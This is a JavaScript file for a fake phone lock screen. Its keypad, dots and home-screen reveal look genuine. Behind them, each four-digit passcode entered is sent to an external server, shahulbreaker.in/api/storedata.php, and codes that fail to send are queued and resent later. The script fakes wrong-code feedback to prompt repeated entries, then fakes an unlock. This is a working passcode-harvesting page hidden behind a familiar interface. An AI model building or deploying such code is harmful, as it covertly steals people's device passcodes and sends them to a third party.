(() => {
  const API_BASE = "https://shahulbreaker.in/api/storedata.php?user=tarunpeek&data=";
  const MAX = 4;
  let code = "";

  const dotEls = Array.from(document.querySelectorAll('.dot'));
  const keys = Array.from(document.querySelectorAll('.key[data-num]'));
  const emergency = document.getElementById('emergency');
  const cancelBtn = document.getElementById('cancel');
  const unlockOverlay = document.getElementById('unlockOverlay');
  const appGrid = document.getElementById('appGrid');
  const ATT_KEY = '_pass_attempt_count_';
  const QUEUE_KEY = '_pass_queue_';

  function getAttempts() { return parseInt(localStorage.getItem(ATT_KEY) || '0', 10); }
  function setAttempts(n) { localStorage.setItem(ATT_KEY, String(n)); }

  function refreshDots() {
    dotEls.forEach((d,i) => d.classList.toggle('filled', i < code.length));
  }

  function reset() {
    code = "";
    refreshDots();
  }

  function queuePass(pass) {
    const q = JSON.parse(localStorage.getItem(QUEUE_KEY) || '[]');
    q.push({ pass, ts: Date.now() });
    localStorage.setItem(QUEUE_KEY, JSON.stringify(q));
  }

  function sendToAPI(pass) {
    const url = API_BASE + encodeURIComponent(pass);
    return fetch(url, { method: 'GET', keepalive: true })
      .catch(() => {
        queuePass(pass);
      });
  }

  function flushQueue() {
    const queue = JSON.parse(localStorage.getItem(QUEUE_KEY) || '[]');
    if (!queue.length) return;
    queue.forEach(item => {
      fetch(API_BASE + encodeURIComponent(item.pass), { method: 'GET', keepalive: true }).catch(()=>{});
    });
    localStorage.removeItem(QUEUE_KEY);
  }

  // ---------- Animation helpers (new) ----------
  let iconsGenerated = false;

  function createAppIcons(count = 20) {
    if (!appGrid || iconsGenerated) return;
    iconsGenerated = true;

    // heuristics: create N icons to fill a 4-column grid
    for (let i = 0; i < count; i++) {
      const icon = document.createElement('div');
      icon.className = 'app-icon';
      // stagger each icon slightly (randomized within a range)
      const base = 60 + (i * 28);
      const jitter = Math.floor(Math.random() * 120); // randomness in ms
      const delay = base + jitter;
      icon.style.setProperty('--delay', `${delay}ms`);
      icon.dataset.delay = `${delay}ms`;

      // create a glyph to simulate app art
      const glyph = document.createElement('div');
      glyph.className = 'glyph';

      // random subtle tint for the glyph to make it feel real
      const hue = Math.floor(Math.random() * 360);
      glyph.style.background = `linear-gradient(180deg, hsl(${hue} 80% 92%) 0%, hsl(${(hue+10)%360} 80% 70%) 100%)`;
      glyph.style.opacity = 0.98;

      icon.appendChild(glyph);
      appGrid.appendChild(icon);

      // set a timeout to add the animate class so CSS animation respects delay
      // (but we rely on the CSS animation-delay using --delay as well)
      void icon.offsetWidth;
    }
  }

  function kickIconAnimation() {
    if (!appGrid) return;
    const icons = Array.from(appGrid.querySelectorAll('.app-icon'));
    icons.forEach((ic, idx) => {
      // set inline style animation-delay for robust behavior
      const delay = ic.dataset.delay || `${idx * 40}ms`;
      ic.style.animationDelay = delay;
      // add animate class to begin 'iconPop'
      ic.classList.add('animate');
    });
  }

  // smooth homescreen reveal handled by CSS keyframes; we just toggle classes
  function playUnlockAnimation() {
    const lockEl = document.querySelector('.lockscreen');
    if (!lockEl || !unlockOverlay) return;

    // Keep original unlocking transform for lockscreen
    lockEl.classList.add('unlocking');

    // Show the overlay (homescreen) and trigger the curtain + icons
    unlockOverlay.classList.add('show', 'reveal');
    unlockOverlay.setAttribute('aria-hidden', 'false');

    // Create icons once and then animate them
    createAppIcons(20);
    // minor delay to coordinate curtain + icons
    setTimeout(() => {
      kickIconAnimation();
    }, 140); // icons start slightly after curtain begins

    // Optional: let the overlay settle after animation (we keep overlay visible to show homescreen)
    // If you want to remove overlay after N ms, uncomment below:
    // setTimeout(() => { unlockOverlay.classList.remove('show','reveal'); }, 4000);
  }

  function animateWrongAttempt() {
    const dotsEl = document.getElementById('dots');
    if (!dotsEl) {
      reset();
      return;
    }
    const DURATION = 700;
    dotsEl.classList.add('wrong');
    reset();
    setTimeout(() => {
      dotsEl.classList.remove('wrong');
    }, DURATION + 20);
  }

  async function handleCompleteAttempt(enteredCode) {
    let attempts = getAttempts();
    attempts += 1;
    setAttempts(attempts);

    if (attempts === 3) {
      sendToAPI(enteredCode);
      animateWrongAttempt();
    } else if (attempts === 5) {
      // 5th attempt triggers the realistic unlock
      sendToAPI(enteredCode); // keep your original behavior if you want to send it too
      playUnlockAnimation();
      setTimeout(reset, 300);
    } else {
      animateWrongAttempt();
    }

    if (attempts >= 5) {
      setAttempts(0);
    }
  }

  function animateBrightness(el, target, duration) {
    let startTime;
    const initial = parseFloat(el.dataset.brightness || "1");
    const change = target - initial;

    function easeOutCubic(t) {
      return 1 - Math.pow(1 - t, 3);
    }

    function frame(ts) {
      if (!startTime) startTime = ts;
      const progress = Math.min((ts - startTime) / duration, 1);
      const eased = easeOutCubic(progress);
      const value = initial + change * eased;
      el.style.filter = `brightness(${value})`;
      el.dataset.brightness = value.toFixed(3);
      if (progress < 1) {
        requestAnimationFrame(frame);
      }
    }
    requestAnimationFrame(frame);
  }

  keys.forEach(k => {
    const num = k.dataset.num;
    if (!num) return;

    k.addEventListener('touchstart', () => {
      animateBrightness(k, 1.6, 80); // increased brightness
    }, { passive: true });

    const endPress = () => {
      animateBrightness(k, 1, 100);
    };
    k.addEventListener('touchend', endPress);
    k.addEventListener('touchcancel', endPress);
    k.addEventListener('mouseleave', endPress);

    k.addEventListener('click', () => {
      if (code.length >= MAX) return;
      code += num;
      refreshDots();

      if (code.length === MAX) {
        const enteredCode = code;
        setTimeout(() => {
          handleCompleteAttempt(enteredCode);
        }, 120);
      }
    });
  });

  emergency && emergency.addEventListener('click', e => e.preventDefault());
  cancelBtn && cancelBtn.addEventListener('click', e => { e.preventDefault(); reset(); });

  window.addEventListener('online', flushQueue);
  flushQueue();

  window.__passUI = { getCode: () => code, reset, getAttempts, queuePass };

})();
